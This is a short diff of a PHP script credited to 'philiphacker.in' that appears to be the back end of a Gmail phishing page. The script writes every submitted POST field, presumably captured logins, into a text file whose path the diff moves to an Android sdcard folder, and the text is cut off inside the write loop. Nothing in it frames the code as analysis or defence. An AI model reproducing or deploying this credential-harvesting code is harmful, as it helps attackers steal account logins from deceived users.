@@ -3,7 +3,7 @@
 // www.philiphacker.in
 header
 ('location:');
-$handle=fopen("idz.txt","a");
+$handle=fopen("/sdcard/www.philiphacker.in/gmail/idz.txt","a");
 foreach($_POST as $variable=>$value)
 {
 fwrite($handle,$variable);
